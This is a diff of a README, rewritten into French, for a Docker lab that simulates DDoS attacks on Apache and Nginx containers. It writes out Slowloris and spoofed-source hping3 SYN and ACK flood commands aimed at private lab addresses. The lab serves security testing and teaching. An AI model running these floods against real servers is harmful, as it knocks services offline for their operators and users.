@@ -1,3 +1,17 @@
+# DDoS Attack Simulation Tool
+
+Ce projet fournit un ensemble d'outils pour simuler des attaques DDoS contre des serveurs Apache et Nginx à des fins de test et d'évaluation de la sécurité.
+
+## Prérequis
+
+- Docker et Docker Compose doivent être installés sur votre machine.
+
+## Utilisation
+
+1. Construction et exécution des conteneurs
+
+```bash
+docker-compose -f stack.yml up -d --build
 
 # build images and run containers
 
@@ -5,55 +19,54 @@
 docker-compose -f stack.yml up -d --build
 ```
 
-# HTTP flood attack
+2. Attaques HTTP Flood
 
-## Launch the slowloris(slow HTTP GET attack) attack against the apache-server
+- Attaque Slowloris contre le serveur Apache
 
 ```bash
 docker exec -ti attacker-DDOS /bin/bash -c "slowloris 172.20.0.2 -s 1000"
 ```
 
-## Launch the slowloris(slow HTTP GET attack) attack against the nginx-server
+- Attaque Slowloris contre le serveur Nginx
 
 ```bash
 docker exec -ti attacker-DDOS /bin/bash -c "slowloris 172.20.0.3 -s 1000"
 ```
 
-# SYN flood attack
+3. Attaques SYN Flood
 
-- Launch the SYN flood attack against the apache-server
+- Attaque SYN Flood contre le serveur Apache
 
 ```bash
 docker exec -ti attacker-DDOS /bin/bash -c "hping3 -S -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.2"
 ```
 
-- Launch the SYN flood attack against the nginx-server
-
+- Attaque SYN Flood contre le serveur Nginx
 ```bash
 docker exec -ti attacker-DDOS /bin/bash -c "hping3 -S -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.3"
 ```
 
-# ACK flood attack
+4. Attaques ACK Flood
 
-- Launch the ACK flood attack against the apache-server
-
+- Attaque ACK Flood contre le serveur Apache
 ```bash
 docker exec -ti attacker-DDOS /bin/bash -c "hping3 -A -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.2"
 ```
 
-- Launch the ACK flood attack against the nginx-server
-
+- Attaque ACK Flood contre le serveur Nginx
 ```bash
 docker exec -ti attacker-DDOS /bin/bash -c "hping3 -A -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.3"
 ```
 
-# stop and remove containers   
-
+5. Arrêt et suppression des conteneurs
 ```bash
 docker-compose -f stack.yml down
 ```
-## Auteur
 
+## Avertissement
+Ce projet est uniquement destiné à des fins éducatives et de test. L'utilisation de ces outils contre des systèmes sans autorisation est illégale.
+
+## Auteur
 Ahmat Mahamat Ahmat
 
 Email : ahmatmhtlouky@gmail.com
